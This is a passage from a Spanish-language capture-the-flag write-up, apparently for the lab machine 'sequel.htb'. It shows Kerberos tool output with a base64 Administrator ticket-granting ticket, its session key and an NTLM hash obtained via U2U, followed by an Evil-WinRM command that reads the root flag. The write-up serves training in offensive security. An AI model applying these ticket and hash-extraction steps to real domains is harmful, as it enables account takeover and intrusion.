      O15eaD504RGGeETZwD2fU72naJCxHwGpN9+bB+LDR1zgGiKcQC75bJo5LLJwv+iiBeyvus1AV8iJLrtF
      4nHBPfLxPgDg0gpwH0e1omwLqLEDoEhEgutjDY8dh+TWr+gsAGlHuIw8o0Fl3/PIlR/nYlYNvI19lO/3
      pgb/4VL7rM1tI60Zf/IFNV+LXSSgOJXszF6AnHPWoXyCfdzdwASAuhFF+ce9TmdSysIconPeE27FmE3L
      v4cenvh+LKhjlEl6ai3KTI2J+nNALAWzTDSpa3CIeZ8Mt6LQDBETFv6xNXDsFTVVsEKkhxSCbPdmNXtT
      cl7F8IYgBDMappW4ohVRHlzuHm2b4hvayI/PXySZHG3gC8TLVTHF6YHdJIT67HZrHGaV15VEE/ZixnDh
      vDqwpzVcpB3NNPoiISUFqnqcQxHiQlRFZsfNBqBAhTBKoDu6pJSC1QB8baqjwGRWSfcixTRGkdl/CnQQ
      Z0K3oR5lZzDsDUzCtW6lx4UadVcZfdAyqqSu+m23bdX2Ql58B2oXqgloa398MNb/3GPxOBp7lJV22syY
      DH/kwoR6dFAI2pAXfYnRr8AZc6T6PBqxcvO6c15WOK2Yk8vfflkRmRp0FvYIEXH1m7hMoZdBtXwHkZXP
      lckRCKZiWj9KMEMMDS3wVfuUreD3EJ91CjK5l2myS5U1/G9bmzCSAT9gCdebFkdOH5lTLmLifvntrBVg
      9fYsroDowV3C1TajfnzRICfpTkqd82gdJpIJKNhMYtwXBhy6uM4AwBq7ku+kJ87oIdBNMvu84QdwKHzV
      uo0Y1bVqsda81Jyq5AwYdiBYYaua2U8VM4AOBdI2hdCneLcjUsPaKfvIxk+SOg4lc17bN2JVdHbQx4F1
      c/JANV9wUyLWZLMArxK9YkKSmbafcAg+VjNtxrwbhAdSHq1/HLa8d11EBAuc5SO6sIMLN7gM3xoyPVNY
      UsG6mFlIpvQ5UXY43nWJJZFQ1M3E8FWcSJDelwhi7hSHVFcWQllqwKXcZxd3aJy4EgH/FatsaZVwWlO1
      KEfW89cP2Tq+XaoQZnSZnRBeKY7d96qAhndCbhOAoGoiItPGlnMJ3XPrSyjNi64vRwzhmN7dEVm3Wsvk
      569QUx0OoX479QmVs519kvU4l//1iKH6aTaIhZZCMB0RMQmj2JAZE3cU+tXoO9i8zA0N6cIdsd93Dl61
      3ragvbtN9v5D+IAOPqhOxacD5neji1b+GUUd3k3Rx0pUasP2jH9FTEz053qiShDG8FBTpMrNd4miWrPf
      f3WXcfgWb63e70y5chWABpyJ/4TReWFK7pZzfhJYeDwXf1N8tkD80/yhpz9YL6iivB7sAJUuhZiRZBNS
      tNlmD8DITLPlJGgQXA2wE6OB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
      EER9rGfhrfbi/Pk0cZdMLTWhDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAADhAAClERgPMjAyMzA1MjUwMTAzMDBaphEYDzIwMjMwNTI1MTEwMzAwWqcRGA8yMDIzMDYwMTAx
      MDMwMFqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  5/24/2023 6:03:00 PM
  EndTime                  :  5/25/2023 4:03:00 AM
  RenewTill                :  5/31/2023 6:03:00 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  RH2sZ+Gt9uL8+TRxl0wtNQ==
  ASREP (key)              :  49855956009FBA2B237BE1D6AAC84291

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```


Puedo ver la segunda flag

```null
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
ed5d66ea2ceb7282e9d2284244d4d683
```